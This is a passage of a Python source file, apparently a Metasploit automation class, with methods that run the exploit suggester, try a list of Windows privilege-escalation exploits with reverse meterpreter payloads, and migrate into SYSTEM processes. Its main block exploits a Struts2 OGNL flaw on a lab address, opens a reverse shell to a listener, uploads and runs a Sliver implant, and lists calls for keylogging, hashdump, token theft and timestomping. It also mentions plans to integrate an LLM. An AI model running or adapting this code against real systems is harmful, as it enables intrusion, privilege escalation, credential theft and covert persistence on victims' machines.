            # Execute the post module
            result = post_module.execute()
            
            # Wait a bit for execution to complete
            time.sleep(3)
            
            return result
            
        except Exception as e:
            print(f"[!] Error running post module {post_module_name}: {e}")
            return None

    def run_local_exploit_suggester(self, session_id=None):
        """Run the local exploit suggester post module using console for complete output"""
        if session_id is None:
            session_id = self.default_session_id
            
        print(f"[*] Running local exploit suggester on session {session_id}")
        
        try:
            # Create console for running the post module
            cid = self.client.call(MsfRpcMethod.ConsoleCreate)["id"]
            console = self.client.consoles.console(cid)
            
            # Run the post module through console to capture all output
            commands = [
                f"use post/multi/recon/local_exploit_suggester",
                f"set SESSION {session_id}",
                "run"
            ]
            
            print("[*] Executing local exploit suggester...")
            
            for cmd in commands:
                print(f"[*] Command: {cmd}")
                console.write(cmd)
                time.sleep(2)  # Wait between commands
                
                # Read immediate output
                output = ""
                attempts = 0
                while attempts < 10:
                    try:
                        data = console.read()
                        if data:
                            if isinstance(data, dict):
                                actual_data = data.get('data', '')
                                if actual_data:
                                    output += actual_data
                                else:
                                    break
                            else:
                                output += str(data)
                        else:
                            attempts += 1
                            time.sleep(0.5)
                    except Exception as read_error:
                        print(f"[!] Error reading output: {read_error}")
                        break
                
                if output.strip():
                    print(output.strip())
            
            # Wait longer for the exploit suggester to complete and read final output
            print("[*] Waiting for exploit suggester to complete (this may take a while)...")
            
            # Read output continuously for up to 60 seconds
            total_output = ""
            start_time = time.time()
            max_wait_time = 60  # Maximum wait time in seconds
            
            while time.time() - start_time < max_wait_time:
                try:
                    data = console.read()
                    if data:
                        if isinstance(data, dict):
                            actual_data = data.get('data', '')
                            if actual_data:
                                total_output += actual_data
                                print(actual_data, end='')  # Print output in real-time
                        else:
                            data_str = str(data)
                            total_output += data_str
                            print(data_str, end='')
                    else:
                        time.sleep(1)  # Wait a bit before checking again
                        
                    # Check if the module has completed
                    if "Exploit suggester completed" in total_output or \
                       "exploit(s) detected" in total_output.lower() or \
                       "msf6 post" in total_output:
                        print("\n[+] Exploit suggester completed!")
                        break
                        
                except Exception as e:
                    print(f"[!] Error reading console output: {e}")
                    break
            
            if not total_output.strip():
                print("[-] No output captured from exploit suggester")
                print("[*] The module may still be running or completed without visible output")
            
            # Destroy the console
            try:
                self.client.call(MsfRpcMethod.ConsoleDestroy, [cid])
            except:
                pass
            
            return total_output
            
        except Exception as e:
            print(f"[!] Error running local exploit suggester: {e}")
            import traceback
            traceback.print_exc()
            return None

    def run_local_exploit(self, exploit_module_name, session_id=None, payload_module_name="windows/meterpreter/reverse_tcp", 
                          lhost=None, lport=None):
        """Run a local privilege escalation exploit"""
        try:
            if session_id is None:
                session_id = self.default_session_id
                
            # Get sessions before exploit to track new ones
            sessions_before = self.get_sessions()
            existing_session_ids = set(sessions_before.keys())
            
            print(f"[*] Running local exploit: {exploit_module_name}")
            print(f"[*] Target session: {session_id}")
            
            # Set up the local exploit
            local_exploit = self.client.modules.use("exploit", exploit_module_name)
            # Convert session_id to integer as required by Metasploit RPC
            local_exploit["SESSION"] = int(session_id)
            
            # Set up payload for the new session
            payload = self.client.modules.use("payload", payload_module_name)
            
            if lhost is None:
                lhost = self.host
            if lport is None:
                lport = str(int(self.listening_port) + 1)  # Use different port
                
            payload["LHOST"] = lhost
            payload["LPORT"] = lport
            
            print(f"[*] Payload: {payload_module_name}")
            print(f"[*] LHOST: {lhost}, LPORT: {lport}")
            
            # Execute the exploit
            result = local_exploit.execute(payload=payload)
            
            # Wait for session creation
            time.sleep(10)
            
            # Check for new sessions
            sessions_after = self.get_sessions()
            new_sessions = [
                sid for sid, info in sessions_after.items()
                if info.get("type") == "meterpreter" and sid not in existing_session_ids
            ]
            
            if new_sessions:
                print(f"[+] New privileged session created: {new_sessions[0]}")
                self.set_default_session(new_sessions[0])
                return new_sessions[0]
            else:
                print("[-] No new session created, privilege escalation may have failed")
                return None
                
        except Exception as e:
            print(f"[!] Error running local exploit {exploit_module_name}: {e}")
            return None

    def run_local_exploit_console(self, exploit_module_name, session_id=None, 
                                  payload_module_name="windows/meterpreter/reverse_tcp", 
                                  lhost=None, lport=None):
        """Console-based local privilege escalation exploit"""
        try:
            if session_id is None:
                session_id = self.default_session_id
                
            if lhost is None:
                lhost = self.host
            if lport is None:
                lport = str(int(self.listening_port) + 1)
            
            # Get sessions before exploit
            sessions_before = self.get_sessions()
            existing_session_ids = set(sessions_before.keys())
            
            # Create console
            cid = self.client.call(MsfRpcMethod.ConsoleCreate)["id"]
            console = self.client.consoles.console(cid)
            
            print(f"[*] Console-based local exploit: {exploit_module_name}")
            print(f"[*] Target session: {session_id}")
            print(f"[*] LHOST: {lhost}, LPORT: {lport}")
            
            commands = [
                f"use exploit/{exploit_module_name}",
                f"set SESSION {session_id}",
                f"set payload {payload_module_name}",
                f"set LHOST {lhost}",
                f"set LPORT {lport}",
                "exploit -j"
            ]
            
            for cmd in commands:
                try:
                    print(f"[*] Executing: {cmd}")
                    console.write(cmd)
                    time.sleep(1.5)  # Longer delay for local exploits
                    
                    # Read output with error handling
                    output = ""
                    attempts = 0
                    while attempts < 10:  # More attempts to read output
                        try:
                            data = console.read()
                            if data:
                                # Ensure data is string before concatenation
                                if isinstance(data, dict):
                                    # Extract actual data from dictionary response
                                    actual_data = data.get('data', '')
                                    if actual_data:  # Only process if there's actual data
                                        output += actual_data
                                    else:
                                        # If no actual data, break to avoid infinite loop
                                        break
                                elif not isinstance(data, str):
                                    data = str(data)
                                    output += data
                                else:
                                    output += data
                            else:
                                attempts += 1
                                time.sleep(0.5)
                        except Exception as read_error:
                            print(f"[!] Error reading console output: {read_error}")
                            break
                    
                    if output.strip():
                        print(f"[*] Output: {output.strip()}")
                    
                    # Extra wait for exploit command
                    if cmd.startswith("exploit"):
                        print("[*] Waiting for local exploit to complete...")
                        time.sleep(15)  # Longer wait for privilege escalation
                        
                except Exception as cmd_error:
                    print(f"[!] Error executing command '{cmd}': {cmd_error}")
                    import traceback
                    traceback.print_exc()
                    continue
            
            # Check for new sessions with extended waiting
            max_attempts = 8
            for attempt in range(max_attempts):
                time.sleep(5)
                sessions_after = self.get_sessions()
                new_sessions = [
                    sid for sid, info in sessions_after.items()
                    if info.get("type") == "meterpreter" and sid not in existing_session_ids
                ]
                
                if new_sessions:
                    print(f"[+] New privileged session created: {new_sessions[0]}")
                    self.set_default_session(new_sessions[0])
                    
                    # Verify session stability
                    time.sleep(3)
                    if self.verify_session_stability(new_sessions[0]):
                        return new_sessions[0]
                    else:
                        print("[-] Privileged session created but not stable...")
                        continue
                else:
                    print(f"[*] Privilege escalation attempt {attempt + 1}/{max_attempts}: Waiting...")
            
            print("[-] No stable privileged sessions created")
            return None
            
        except Exception as e:
            print(f"[!] Error in console-based local exploit: {e}")
            import traceback
            traceback.print_exc()
            return None

    def migrate_process(self, target_pid, session_id=None):
        """Migrate to a different process"""
        try:
            if session_id is None:
                session_id = self.default_session_id
                
            shell = self.client.sessions.session(session_id)
            
            # Send migrate command and wait for completion
            shell.write(f"migrate {target_pid}")
            time.sleep(3)  # Give migration time to complete
            
            # Read all available output
            result_lines = []
            max_attempts = 10
            attempt = 0
            
            while attempt < max_attempts:
                try:
                    output = shell.read()
                    if output:
                        result_lines.append(output)
                        # If we see completion messages, we can break
                        if any(keyword in output.lower() for keyword in ['completed', 'success', 'failed', 'error']):
                            break
                    else:
                        attempt += 1
                        time.sleep(0.5)
                except:
                    break
            
            full_result = "".join(result_lines) if result_lines else ""
            print(f"[*] Migration result: {full_result}")
            return full_result
            
        except Exception as e:
            print(f"[!] Error migrating to process {target_pid}: {e}")
            return None

    def check_privileges(self, session_id=None):
        """Check current privileges and user context"""
        try:
            if session_id is None:
                session_id = self.default_session_id
                
            print("[*] Checking current privileges...")
            
            # Get current user
            self.getuid(session_id)
            
            # Get privileges
            self.getprivs(session_id)
            
            # Get SID
            self.getsid(session_id)
            
        except Exception as e:
            print(f"[!] Error checking privileges: {e}")

    def try_privilege_escalation(self, session_id=None, lhost=None, lport_base=4444):
        """Try multiple privilege escalation exploits"""
        if session_id is None:
            session_id = self.default_session_id
            
        # List of common Windows local exploits to try
        exploits_to_try = [
            "windows/local/ms14_070_tcpip_ioctl",
            "windows/local/ms15_051_client_copy_image", 
            "windows/local/ms14_058_track_popup_menu",
            "windows/local/ms10_015_kitrap0d",
            "windows/local/ms16_016_webdav"
        ]
        
        print(f"[*] Attempting privilege escalation with {len(exploits_to_try)} exploits...")
        
        for i, exploit in enumerate(exploits_to_try):
            print(f"\n[*] Trying exploit {i+1}/{len(exploits_to_try)}: {exploit}")
            
            try:
                privileged_session = self.run_local_exploit(
                    exploit,
                    session_id=session_id,
                    lhost=lhost,
                    lport=str(lport_base + i)
                )
                
                if privileged_session:
                    print(f"[+] Privilege escalation successful with {exploit}!")
                    return privileged_session
                else:
                    print(f"[-] Exploit {exploit} failed, trying next...")
                    
            except Exception as e:
                print(f"[-] Error with {exploit}: {e}")
                continue
        
        print("[-] All privilege escalation attempts failed")
        return None

    def get_process_info(self, session_id=None):
        """Get detailed process information for migration purposes"""
        try:
            if session_id is None:
                session_id = self.default_session_id
            
            print("[*] Getting process information...")
            ps_output = self.execute_meterpreter_command("ps", session_id)
            
            # Parse process output to find good migration targets
            processes = []
            lines = ps_output.split('\n')
            
            for line in lines:
                if 'NT AUTHORITY\\SYSTEM' in line or 'NETWORK SERVICE' in line:
                    parts = line.split()
                    if len(parts) >= 3 and parts[0].isdigit():
                        processes.append({
                            'pid': parts[0],
                            'name': parts[2],
                            'user': 'SYSTEM' if 'NT AUTHORITY\\SYSTEM' in line else 'NETWORK SERVICE'
                        })
            
            return processes
            
        except Exception as e:
            print(f"[!] Error getting process info: {e}")
            return []

    # will integrate LLM in future
    def smart_migrate(self, session_id=None):
        """Intelligently migrate to a better process"""
        try:
            if session_id is None:
                session_id = self.default_session_id
            
            processes = self.get_process_info(session_id)
            
            # Preferred processes for migration (in order of preference)
            preferred_processes = ['davcdata.exe', 'w3wp.exe', 'inetinfo.exe', 'svchost.exe']
            
            for proc_name in preferred_processes:
                for proc in processes:
                    if proc['name'].lower() == proc_name.lower():
                        print(f"[*] Attempting to migrate to {proc_name} (PID: {proc['pid']})")
                        result = self.migrate_process(proc['pid'], session_id)
                        print(f"[*] Migration result: {result}")
                        if result and ('migration completed successfully' in str(result).lower() or 
                                     ('migration' in str(result).lower() and 'completed' in str(result).lower() and 
                                      'error' not in str(result).lower() and 'failed' not in str(result).lower())):
                            print(f"[+] Successfully migrated to {proc_name}")
                            return True
                        else:
                            print(f"[-] Migration to {proc_name} failed: {result}")
            
            print("[-] Could not find suitable process for migration")
            return False
            
        except Exception as e:
            print(f"[!] Error in smart migration: {e}")
            return False
    
    def kill_all_sessions(self):
        """Kill all active Metasploit sessions"""
        try:
            sessions = self.get_sessions()
            
            if not sessions:
                print("[*] No active sessions to kill")
                return True
            
            print(f"[*] Found {len(sessions)} active session(s)")
            
            killed_count = 0
            failed_count = 0
            
            for session_id in list(sessions.keys()):
                try:
                    print(f"[*] Killing session {session_id}...")
                    self.client.sessions.session(session_id).stop()
                    killed_count += 1
                    print(f"[+] Session {session_id} killed successfully")
                except Exception as e:
                    failed_count += 1
                    print(f"[-] Failed to kill session {session_id}: {e}")
            
            print(f"\n[*] Summary: {killed_count} killed, {failed_count} failed")
            
            # Verify all sessions are gone
            time.sleep(2)
            remaining_sessions = self.get_sessions()
            if remaining_sessions:
                print(f"[!] Warning: {len(remaining_sessions)} session(s) still active")
                return False
            else:
                print("[+] All sessions successfully terminated")
                return True
                
        except Exception as e:
            print(f"[!] Error killing sessions: {e}")
            return False


def extract_filename(search_output):
    # Try to match Linux paths first (e.g., /home/user/file.txt)
    linux_match = re.search(r'(/(?:[\w\s.-]+/)*[\w\s.-]+\.\w+)', search_output)
    
    # Try to match Windows paths (e.g., C:\Users\file.txt)
    windows_match = re.search(r'([a-zA-Z]:\\(?:[\w\s.-]+\\)*[\w\s.-]+\.\w+)', search_output)
    
    # Check for tabular format output (search command results)
    # Look for paths in the Path column
    lines = search_output.split('\n')
    for line in lines:
        line = line.strip()
        # Skip header lines and empty lines
        if not line or 'Path' in line or '----' in line or 'Size' in line:
            continue
        # Look for lines that start with a path
        if line.startswith('/') and '.' in line:
            # Extract just the path part (first column)
            path_parts = line.split()
            if path_parts:
                potential_path = path_parts[0]
                if '.' in potential_path:  # Has file extension
                    print(f"Extracted Path from table: {potential_path}")
                    return potential_path
    
    # Use regex matches if tabular parsing didn't work
    if linux_match:
        full_path = linux_match.group(1).strip()
        print(f"Extracted Linux Path: {full_path}")
        return full_path
    elif windows_match:
        full_path = windows_match.group(1).strip()
        print(f"Extracted Windows Path: {full_path}")
        return full_path
    else:
        print("No valid path found!")
        return None


if __name__ == "__main__":
    me = MetasploitExecutor(
        password="123456", host_ip="127.0.0.1", listening_port=55552
    )
    # me.exploit_and_execute_payload(
    #     target="192.168.146.140",
    #     PASSWORD="Scam2021",
    #     TARGETURI="/subrion",
    #     RPORT=80,
    #     exploit_module_name="multi/http/subrion_cms_file_upload_rce",
    #     payload_module_name="php/meterpreter/reverse_tcp",
    #     listening_host="192.168.217.129",
    #     listening_port="4444",
    # )
    me.exploit_and_execute_payload(
        RHOSTS="172.30.0.14",
        TARGETURI="/struts2-showcase/integration/saveGangster.action",
        RPORT=8080,
        exploit_module_name="exploit/multi/http/struts2_content_type_ognl",
        payload_module_name="linux/x64/meterpreter/reverse_tcp",
        LHOST="172.30.0.11",
        LPORT="4444",
    )

    meterpreter_sessionid = me.select_session()
    commands = """
        whoami
        ipconfig
    """
    me.communicate_with_msf_session(
        input_texts=commands, session_id=meterpreter_sessionid
    )
    ## Windows
    # Stdapi: Networking Commands
    # me.getproxy(meterpreter_sessionid)
    # me.ifconfig(meterpreter_sessionid)
    # me.ipconfig(meterpreter_sessionid)
    # me.netstat(meterpreter_sessionid)
    # me.route(action="add", subnet="10.0.0.0", netmask="255.0.0.0", gateway="10.0.0.1") #need higher privilege

    # Stdapi: System Commands
    # me.drop_token(meterpreter_sessionid)
    # me.getprivs(meterpreter_sessionid)
    # me.getsid(meterpreter_sessionid)
    # me.reboot(meterpreter_sessionid)
    # me.rev2self(meterpreter_sessionid)
    # me.shutdown(meterpreter_sessionid)
    # me.steal_token(6864, meterpreter_sessionid)
    # me.suspend(6864, options="-c", meterpreter_sessionid=meterpreter_sessionid)

    # Stdapi: User interface Commands
    # me.enumdesktops(meterpreter_sessionid)
    # me.getdesktop(meterpreter_sessionid)
    # me.idletime(meterpreter_sessionid)
    # me.keyboard_send("Hello World", meterpreter_sessionid)
    # me.keyscan_start(meterpreter_sessionid)
    # me.keyscan_stop(meterpreter_sessionid)
    # me.keyscan_dump(meterpreter_sessionid)
    # me.mouse("move", x=100, y=100, meterpreter_sessionid=meterpreter_sessionid)
    # me.setdesktop("winsta0\\default", meterpreter_sessionid)
    # me.keyevent(32, meterpreter_sessionid)
    # me.uictl(
    #     component="keyboard",
    #     action="disable",
    #     meterpreter_sessionid=meterpreter_sessionid,
    # )
    # me.screenshare(50, meterpreter_sessionid)
    # me.screenshot(meterpreter_sessionid)

    # Priv: Elevate Commands
    # me.getsystem(meterpreter_sessionid)

    # Priv: Password database Commands
    # me.hashdump(meterpreter_sessionid)

    # Timestomp Commands
    # me.timestomp(
    #     "C:\\Users\\Attacker\\Desktop\\test.txt",
    #     "10/01/2020 03:24:00",
    #     action="m",
    #     meterpreter_sessionid=meterpreter_sessionid,
    # )

    ## Linux
    # Stdapi: File system Commands
    # me.cat("/tmp/1.txt", meterpreter_sessionid)
    # me.cd("/bin", meterpreter_sessionid)
    # me.pwd(meterpreter_sessionid)
    # me.chmod("/tmp/1.txt", 777, meterpreter_sessionid)
    # me.checksum("/var/www/html/index.html", "md5", meterpreter_sessionid)
    # me.cp("/var/www/html/index.html", "/tmp/index.html", meterpreter_sessionid)
    # me.delete("/tmp/index.html", meterpreter_sessionid)
    # me.delete("C:/Users/Attacker/Desktop/test1.txt", meterpreter_sessionid)
    # me.dir("/tmp", meterpreter_sessionid)
    # me.mkdir("/tmp/tmp", meterpreter_sessionid)
    # me.mv("/tmp/index.html", "/tmp/index2.html", meterpreter_sessionid)
    # me.rm("/tmp/index.html", meterpreter_sessionid)
    # me.rmdir("/tmp/tmp", meterpreter_sessionid)
    # me.search("*.tmb", meterpreter_sessionid)
    me.upload("/home/lexuswang/sliver.elf", "/tmp/1.elf", meterpreter_sessionid)
    me.chmod(file_path='/tmp/1.elf', mode="777", meterpreter_sessionid=meterpreter_sessionid)
    me.execute("/tmp/1.elf", meterpreter_sessionid=meterpreter_sessionid)
    # me.download("/tmp/1.txt", "/home/kali/Desktop/tmp", meterpreter_sessionid)

    # Stdapi: Networking Commands
    me.arp(meterpreter_sessionid)

    # Stdapi: System Commands testing-ALL OK
    # me.execute("/usr/bin/whoami -i", meterpreter_sessionid)
    # me.getenv("PATH", meterpreter_sessionid)
    me.getpid(meterpreter_sessionid)
    me.getuid(meterpreter_sessionid)
    # me.kill(2769, meterpreter_sessionid)
    # me.localtime(meterpreter_sessionid)
    # me.pgrep("bash", meterpreter_sessionid)
    # me.pkill("bash", meterpreter_sessionid)
    # me.ps(meterpreter_sessionid)
    # me.shell(meterpreter_sessionid)
    # me.sysinfo(meterpreter_sessionid)
    me.kill_all_sessions()
